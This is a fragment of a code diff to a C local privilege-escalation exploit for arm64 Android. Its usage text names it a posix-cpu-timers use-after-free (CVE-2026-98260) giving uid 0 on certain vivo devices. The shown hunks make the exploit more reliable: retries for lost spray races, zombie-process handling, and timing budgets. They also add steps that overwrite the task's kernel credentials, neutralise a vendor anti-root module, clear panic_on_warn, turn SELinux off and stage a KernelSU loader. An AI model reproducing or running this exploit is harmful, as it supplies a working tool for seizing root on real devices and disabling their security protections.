+            if (pthread_create(&th[i], NULL, spray_thread, &args[i]) == 0)
+                created[i] = 1;
         }
     }
     /*
      * Release the race without spray CPU contention; V is already captured,
      * so the burst can start immediately after the zombie appears.
      */
+    logf("[+] plant%d spray armed, releasing target\n", tag);
+    long go_ms = now_ms();
     if (g_timer_go_w >= 0)
     {
-        if (write(g_timer_go_w, "x", 1) != 1)
-            logf("[-] timer go failed\n");
-        close(g_timer_go_w);
-        g_timer_go_w = -1;
+        ssize_t wn;
+        int werr = 0;
+
+        do
+            wn = write(g_timer_go_w, "x", 1);
+        while (wn < 0 && errno == EINTR);
+        if (wn != 1)
+            werr = errno;
+        close_timer_go();
+        if (wn != 1)
+        {
+            /* No go byte reached the target, so its exec never started and
+             * no stale node exists.  Reap it and retry. */
+            logf("[-] plant%d timer go failed errno=%d; retryable\n", tag, werr);
+            res->why = "timer_go_failed";
+            atomic_store(&g_stop_spray, 1);
+            atomic_store(&g_burst2, 1);
+            spray_join(th, created);
+            trace_stop();
+            kill(T, SIGKILL);
+            waitpid(T, NULL, 0);
+            free(payload);
+            payload = NULL;
+            res->retry = 1;
+            return;
+        }
     }
 
     siginfo_t si;
@@ -1391,21 +1806,28 @@ static void run_plant(unsigned long long target, int tag, int mode,
     {
         atomic_store(&g_stop_spray, 1);
         atomic_store(&g_burst2, 1);
-        for (int i = 0; i < SPRAY_THREADS; i++)
-            pthread_join(th[i], NULL);
+        spray_join(th, created);
         trace_stop();
-        logf("[-] plant%d no zombie; holding child\n", tag);
-        g_held++;
+        res->why = "no_zombie";
+        logf("[-] plant%d no zombie after %ldms; holding child\n", tag,
+             now_ms() - go_ms);
+        /* The target never reached its exec, so there is no timerqueue node:
+         * its helpers can be reaped instead of being leaked for the rest of
+         * the run. */
+        kill(T, SIGKILL);
+        waitpid(T, NULL, 0);
+        free(payload);
+        payload = NULL;
+        res->retry = 1;
         return;
     }
-    logf("[+] plant%d target=%d etid=%d zombie code=%d status=%d\n",
-         tag, T, etid, si.si_code, si.si_status);
+    logf("[+] plant%d target=%d etid=%d zombie code=%d status=%d after %ldms\n",
+         tag, T, etid, si.si_code, si.si_status, now_ms() - go_ms);
     if (si.si_code != CLD_KILLED)
     {
         atomic_store(&g_stop_spray, 1);
         atomic_store(&g_burst2, 1);
-        for (int i = 0; i < SPRAY_THREADS; i++)
-            pthread_join(th[i], NULL);
+        spray_join(th, created);
         trace_stop();
         if (si.si_code == CLD_EXITED)
         {
@@ -1415,6 +1837,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
             waitpid(T, &st, 0);
             logf("[-] plant%d exec succeeded (status=%d); retryable\n",
                  tag, si.si_status);
+            res->why = "exec_succeeded";
             res->retry = 1;
             free(payload);
             return;
@@ -1456,8 +1879,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
     }
     atomic_store(&g_stop_spray, 1);
     atomic_store(&g_burst2, 1);
-    for (int i = 0; i < SPRAY_THREADS; i++)
-        pthread_join(th[i], NULL);
+    spray_join(th, created);
     trace_stop();
     for (int cpu = 0; cpu < 8 && !hit; cpu++)
     {
@@ -1468,10 +1890,34 @@ static void run_plant(unsigned long long target, int tag, int mode,
     }
     logf("[+] plant%d free_seen=%d burst hit=%d after %ldms\n",
          tag, free_seen, hit, now_ms() - t1);
+    res->free_seen = free_seen;
+    res->hit = hit;
+    res->slab_own = slab_own;
+    res->nrec = nrec;
+    res->elapsed_ms = now_ms() - plant_start;
+    g_dbg_plants++;
+    if (hit)
+        g_dbg_ok++;
+    else if (free_seen)
+        g_dbg_miss++;
+    else
+        g_dbg_slab_shared++;
+    if (res->why && (!strcmp(res->why, "slab_shared") ||
+                     !strcmp(res->why, "burst_missed")))
+        g_dbg_retry++;
+    /* The two ways to reach hit=0 are not the same failure: `free_seen=0`
+     * means the slab never returned to the buddy (someone else still owns a
+     * timer in it), `free_seen=1` means it did but our spray lost the race.
+     * Only the second leaves a node we no longer control. */
+    logf("[dbg] plant%d failure-class=%s\n", tag,
+         hit ? "none" : (free_seen ? "free_seen1_spray_lost" : "free_seen0_slab_busy"));
     if (!hit)
     {
-        logf("[-] plant%d burst missed; holding zombie\n", tag);
+        logf("[-] plant%d burst missed; holding zombie, retryable\n", tag);
+        res->why = "burst_missed";
         g_held++;
+        res->retry = 1;
+        free(payload);
         return;
     }
 
@@ -1485,6 +1931,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
          mode == 2 ? "fake" : "zero", target);
     free(payload);
 }
+
 
 /*
  * The child execs this binary so that it owns a private real cred.  The exec
@@ -1764,7 +2211,15 @@ static int wait_child_main(const char *mode)
         rep.setuid_ret = -1;
         (void)write(4, &rep, sizeof(rep));
         close(4);
-        logf("[-] child euid is not 0: cred write did not land\n");
+        /* Distinguish a partial fake-cred land from a wipe-out: uid==0 but
+         * euid==-118 means only the fields in the first 4 KiB page took the
+         * zero write, which points at the page-straddling layout rather than
+         * a missed spray. */
+        if (rep.uid == 0 && rep.euid != 0)
+            logf("[-] child euid=%d after uid=0: fake cred fields split across "
+                 "the page boundary did not take the zero writes\n", rep.euid);
+        else
+            logf("[-] child euid is not 0: cred write did not land\n");
         _exit(3);
     }
 
@@ -1916,12 +2371,20 @@ static int zero_write(unsigned long long target, const char *what,
     return -1;
 }
 
-/* vivo vr.ko anti-root. Zero the whole thread_info.flags word (clears the
- * 0x400 syscall-tracepoint work bit AND tag byte A), then zero the 8-byte
- * slot at task+0x28 which covers tag byte B (0x2c): vr kills any task whose
- * tag pair is out of sync. The 0x28 write stays inside thread_info
- * (0x00-0x2f) so __state at 0x30 is untouched. No SIGSTOP freeze; clearing
- * the 0x400 bit first closes the race instead. */
+/*
+ * vivo vr.ko anti-root, ordered so panic_on_warn is disarmed as early as
+ * possible.
+ *
+ * Every zero-mode plant rewrites a stale timer node, and timerqueue_del warns
+ * when it meets that node again: the node is RB_EMPTY_NODE, so the erase is a
+ * no-op that trips WARN_ON_ONCE.  With panic_on_warn=1 that warning is fatal.
+ * The first plant is therefore followed immediately by the sysctl write,
+ * before any further plant can warn again.
+ *
+ * Zeroing thread_info.flags (0x00) clears the 0x400 syscall-tracepoint work
+ * bit and tag byte A; the 0x28 slot covers tag byte B (0x2c) and stays inside
+ * thread_info (0x00-0x2f), so __state at 0x30 is untouched.
+ */
 static void defeat_vr(unsigned long long task, unsigned char *raw, pid_t child)
 {
     (void)child;
@@ -1930,22 +2393,58 @@ static void defeat_vr(unsigned long long task, unsigned char *raw, pid_t child)
         logf("[-] vr de-tag: bad task=%#llx, skipped\n", task);
         return;
     }
-    logf("[+] vr de-tag: task=%#llx, zeroing flags + tagB slot\n", task);
+    logf("[+] vr de-tag: task=%#llx (flags -> panic_on_warn -> tagB -> tp)\n",
+         task);
+
+    /* 1. First plant: clears the work bit and tag A, and supplies the slide
+     *    when calibration could not derive it. */
     zero_write(task + 0x00, "vr-flags", raw);
+
+    /* 2. Disarm panic_on_warn before anything else can warn.  Reading the
+     *    sysctl is denied in the shell domain (returns -1), so write
+     *    unconditionally: a redundant zero is harmless, and a run that cannot
+     *    disarm it may panic on the very next plant. */
+    if (!g_slide)
+        logf("[-] vr de-tag: no slide after vr-flags; cannot write "
+             "panic_on_warn\n");
+    else if (stage_write(PANIC_ON_WARN_STATIC + g_slide, 0,
+                         "panic_on_warn", raw, NULL))
+        logf("[!] vr de-tag: panic_on_warn write failed; a WARN may be fatal\n");
+    else
+        logf("[+] panic_on_warn disarmed before the remaining plants\n");
+
+    /* 3. Remaining per-task tag, then the global tracepoint kill path. */
     zero_write(task + 0x28, "vr-tagB", raw);
-    /* Globally disable vr's sys_exit kill path: the sys_exit tracepoint's
-     * iterator NULL-checks funcs (cbz in the reference disasm), so clearing
-     * the pointer is safe and keeps vr's termination probe from firing for
-     * ANY task -- the KernelSU helpers spawned later included. */
-    zero_write(TP_SYS_EXIT_STATIC + g_slide + TRACEPOINT_FUNCS_OFF,
-               "vr-sys-exit-funcs", raw);
+    /*
+     * Globally disable vr's sys_exit kill path: the tracepoint iterator
+     * NULL-checks funcs (cbz in the reference disasm), so clearing the pointer
+     * is safe and stops vr's termination probe for ANY task, including the
+     * KernelSU helpers spawned later.
+     */
+    if (g_slide)
+        zero_write(TP_SYS_EXIT_STATIC + g_slide + TRACEPOINT_FUNCS_OFF,
+                   "vr-sys-exit-funcs", raw);
+    else
+        logf("[!] vr de-tag: no KASLR slide, sys_exit kill path left intact\n");
     logf("[+] vr de-tag done (tags A+B cleared, sys_exit kill disabled)\n");
+}
+
+/* The fake payload writes fixed-width uid/euid pairs and a five-entry
+ * capability block, so only the two cred layouts the 6.1/6.6 profiles ship
+ * are safe to synthesize. */
+static int fake_layout_supported(void)
+{
+    if (CRED_UID_OFF == 4)
+        return (CRED_REQ == 0xb0 || CRED_REQ == 0xb8) && CRED_ALLOC == 0xc0;
+    if (CRED_UID_OFF == 8)
+        return CRED_REQ == 0xb8 && CRED_ALLOC == 0xc0;
+    return 0;
 }
 
 static void usage(const char *prog)
 {
     printf("CVE-2026-98260 posix-cpu-timers UAF -> uid 0  (arm64)\n");
-    printf("target: 6.1.145-android14-11-maybe-dirty (V2352GA)\n");
+    printf("target: V2352A/V2352GA 6.1.57 / 6.1.124 / 6.1.145 (from uname -r)\n");
     printf("\nusage: %s <mode> [args]\n\n", prog);
     printf("modes:\n");
     printf("  (default)      verify: zero cred uid/gid fields -> uid 0 shell (u:r:shell:s0)\n");
@@ -1959,7 +2458,15 @@ static void usage(const char *prog)
     printf("  --help | -h    this help\n");
     printf("\nnotes:\n");
     printf("  - run as shell (uid 2000) with /sys/kernel/tracing access\n");
-    printf("  - REBOOT is the only clean cleanup (parks zombies / SELinux permissive)\n");
+    printf("  - a failed plant that cannot be reaped leaves a zombie; reboot to clean\n");
+}
+
+/* Stop starting new plants once the run has spent its budget.  A plant that
+ * already owns a timerqueue node still finishes; this only prevents a long
+ * retry chain from running past the app's monitoring window. */
+static int plant_budget_left(void)
+{
+    return g_plant_deadline == 0 || now_ms() < g_plant_deadline;
 }
 
 int main(int argc, char **argv)
@@ -1968,6 +2475,8 @@ int main(int argc, char **argv)
     int shell_mode = 0, leak_only = 0, ids_only = 0;
 
     setvbuf(stdout, NULL, _IONBF, 0);
+    /* A helper pipe can lose its reader when the system kills a target. */
+    signal(SIGPIPE, SIG_IGN);
     snprintf(g_helper_name, sizeof(g_helper_name), "tzh-%d", getpid());
     g_completion_path = getenv("TIMERZ9_COMPLETION_PATH");
     if (g_completion_path)
@@ -1983,6 +2492,22 @@ int main(int argc, char **argv)
     if (argc > 1 && !strcmp(argv[1], "wait"))
         return wait_child_main(argc > 2 ? argv[2] : "verify");
 
+    /*
+     * Version/identity probe.  The app stages the binary over a copy that a
+     * previous run may have left behind, and that copy can be an older build;
+     * printing a build tag lets the app (and a log reader) tell which one
+     * actually ran.  Everything here is kernel-independent.
+     */
+    if (argc > 1 && !strcmp(argv[1], "build"))
+    {
+        logf("timer build %s\n", TIMER_BUILD_TAG);
+        logf("timer profile %s\n", TIMER_PROFILE);
+        logf("timer bus-width %u\n", (unsigned)TIMER_SITE_FIELD_BYTES);
+        logf("timer plant-budget %dms\n", PLANT_BUDGET_MS);
+        logf("timer zombie-timeout %dms\n", ZOMBIE_TIMEOUT_MS);
+        return 0;
+    }
+
     if (argc > 1 && !strcmp(argv[1], "shell"))
         shell_mode = 1;
     if (argc > 1 && !strcmp(argv[1], "leak"))
@@ -1991,6 +2516,12 @@ int main(int argc, char **argv)
         ids_only = 1;
     if (argc > 1 && !strcmp(argv[1], "fake"))
         g_fake_stage = 1;
+    if (g_fake_stage && !fake_layout_supported())
+    {
+        logf("[-] fake cred layout not supported: uid=%#x cred=%#llx/%#llx\n",
+             CRED_UID_OFF, CRED_REQ, CRED_ALLOC);
+        return 1;
+    }
 
     raw = malloc(48u << 20);
     if (!raw)
@@ -2015,8 +2546,10 @@ int main(int argc, char **argv)
 
     pin(g_cpu);
     (void)setpriority(PRIO_PROCESS, 0, -20);
+    g_start_ms = now_ms();
     logf("[+] pid=%d cpu=%d nice=%d\n", getpid(), g_cpu,
          getpriority(PRIO_PROCESS, 0));
+    trace_health("run-start");
     enable_events();
     kick_rss();
     usleep(50000);
@@ -2324,6 +2857,9 @@ int main(int argc, char **argv)
         return 1;
     }
     prefill_timers(PREFILL_TIMERS);
+    /* Plants start after the leak; give them a fixed share of the app's
+     * monitoring window so a retry chain still reports a precise result. */
+    g_plant_deadline = now_ms() + PLANT_BUDGET_MS;
 
     pid_t C = -1;
     int go_fd = -1, st_fd = -1;
@@ -2334,7 +2870,7 @@ int main(int argc, char **argv)
         logf("[-] cred leak failed\n");
         return 1;
     }
-    logf("[+] child=%d cred=%#llx target=%#llx\n", C, R, R + 8);
+    logf("[+] child=%d cred=%#llx target=%#llx\n", C, R, R + CRED_UID_OFF);
     if (leak_only)
     {
         close(go_fd);
@@ -2344,12 +2880,15 @@ int main(int argc, char **argv)
         logf("[+] leak-only run complete\n");
         return 0;
     }
-    if (g_fake_stage)
+    /* The stage script must be complete before the child can source it; a
+     * partial write would only fail after the whole plant chain ran. */
+    if (g_fake_stage && write_ksu_script() != 0)
     {
-        logf("[+] fake endgame: KernelSU late-load via fake cred\n");
-        write_ksu_script();
+        logf("[-] cannot write /data/local/tmp/ksu_stage.sh\n");
+        return 1;
     }
-    ensure_pool();
+    if (ensure_pool() != 0)
+        return 1;
     ensure_raw();
 
     if (!g_fake_stage)
@@ -2384,57 +2923,60 @@ int main(int argc, char **argv)
 
         /* vr.ko anti-root: clear thread_info.flags (0x400 work bit + tagA)
          * BEFORE the child becomes root via the fake cred, so vr's sys_exit
-         * probe won't kill it (or the KernelSU worker it forks). */
+         * probe won't kill it (or the KernelSU worker it forks).  Its plants
+         * also recover the KASLR slide, so the check below runs after it. */
         defeat_vr(g_child_task, raw, C);
 
+        /* The fake cred embeds static symbols; without a slide they would
+         * point into the unmapped link-time image and every fork would fault.
+         * defeat_vr()'s successful plants supply it, so a zero here means they
+         * all failed and the run must not continue. */
         if (!g_slide)
             park_forever("no KASLR slide");
-        /* Zero panic_on_warn BEFORE the fake_cred plant: its self-parent
-         * rb_erase takes the RB_EMPTY_NODE WARN, which panics the device when
-         * the boot default is panic_on_warn=1. The sysctl read below is only
-         * possible after SELinux is off, so gate the direct write here. */
-        if (stage_write(PANIC_ON_WARN_STATIC + g_slide, 0,
-                        "panic_on_warn", raw, NULL))
-            park_forever("panic_on_warn write failed");
 
         memset(&fc, 0, sizeof(fc));
         /*
-         * The self-parent erase takes the RB_EMPTY_NODE WARN; this profile's
-         * panic_on_warn is 0.  The sysctl is only readable after SELinux is
-         * off, so the WARN cannot be gated before this plant.
-         *
          * Point task->cred at the reclaimed page.  The fake cred starts at
          * the stale node address; rb_erase dirties uid/gid with the target,
          * so one zero write repairs them.  suid/sgid keep the rb_left
          * target; the fake cred's full CAP_SETUID and euid 0 make that
          * irrelevant for the fork/exec handoff.
+         *
+         * defeat_vr() already disarmed panic_on_warn right after its first
+         * plant, so the fake-cred plant below runs with the sysctl clear.
+         * Verify only what is verifiable: this device denies reads (-1), so a
+         * negative value means "unknown, the write was attempted", not "still
+         * set".  Treating -1 as truth once parked every run before a single
+         * real plant.
          */
+        {
+            int pow = read_panic_on_warn();
+
+            logf("[dbg] panic_on_warn before fake_cred=%d (%s)\n", pow,
+                 pow < 0 ? "unreadable, write assumed" : "verified");
+            if (pow > 0)
+                park_forever("panic_on_warn still set before fake cred");
+        }
         if (stage_write(g_child_task + OFF_TASK_CRED, 2, "fake_cred",
                         raw, &fc))
             park_forever("fake cred write failed");
-        if (!g_slide)
-            park_forever("no KASLR slide");
         logf("[+] fake cred A=%#llx selinux_state=%#llx\n", fc.A,
              SELINUX_STATE_STATIC + g_slide);
         if (stage_write(SELINUX_STATE_STATIC + g_slide - 7, 0,
                         "selinux", raw, NULL))
             park_forever("selinux write failed");
-        if (read_panic_on_warn() != 0 &&
-            stage_write(PANIC_ON_WARN_STATIC + g_slide, 0,
-                        "panic_on_warn", raw, NULL))
-            park_forever("panic_on_warn write failed");
         if (stage_write(fc.A + CRED_UID_OFF, 0, "fake_uid", raw, NULL))
             park_forever("fake uid fix failed");
-        /* 6.1: stale node dirties bytes 8-23 (gid/suid/sgid/euid). The +4 fix
-         * clears uid (4) + gid (8). euid (20) is in dirtied c2 high half,
-         * so clear euid (20) + egid (24) as well. suid/sgid left dirty is
-         * harmless with FULLCAP + euid 0 (same as 6.6 logic). */
-        if (stage_write(fc.A + 20, 0, "fake_euid", raw, NULL))
+        /* 6.1 keeps a 4-byte usage, so euid lands on the erase target in
+         * c2 and needs its own zero write; the 8-byte-usage layouts put
+         * euid in the pair c3 already clears. */
+        if (CRED_UID_OFF == 4 &&
+            stage_write(fc.A + 0x14, 0, "fake_euid", raw, NULL))
             park_forever("fake euid fix failed");
     }
     if (argc > 2 && !strcmp(argv[2], "safemode"))
         logf("[*] safemode ON: modules will be disabled natively pre-load\n");
-    logf("[+] cred writes landed, waking child\n");
+    logf("[+] cred writes landed after %ldms, waking child\n", now_ms() - g_start_ms);
 
     if (write(go_fd, (argc > 2 && !strcmp(argv[2], "safemode")) ? "S" : "A", 1) != 1)
         logf("[!] child wake write failed\n");
@@ -2496,7 +3038,9 @@ int main(int argc, char **argv)
         park_forever("fake cred page held; reboot to clean");
     if (g_held)
         park_forever("root shell finished; failed-plant zombies are held");
+    trace_health("run-end");
+    dbg_summary("done");
     finish_run();
-    logf("[+] done\n");
+    logf("[+] done in %ldms\n", now_ms() - g_start_ms);
     return 0;
 }
